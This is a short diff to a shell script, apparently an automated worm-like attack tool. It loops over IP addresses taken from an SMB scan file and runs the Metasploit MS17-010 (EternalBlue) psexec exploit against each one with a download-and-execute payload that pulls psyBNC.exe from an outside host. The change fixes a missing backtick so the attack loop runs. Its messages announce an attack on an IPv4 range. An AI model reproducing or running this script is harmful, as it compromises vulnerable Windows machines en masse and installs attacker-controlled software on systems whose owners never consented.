@@ -24,5 +24,5 @@ sleep 1s;
 echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
 sleep 1m;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
 echo !!!THE END OF THE WORLD!!!;
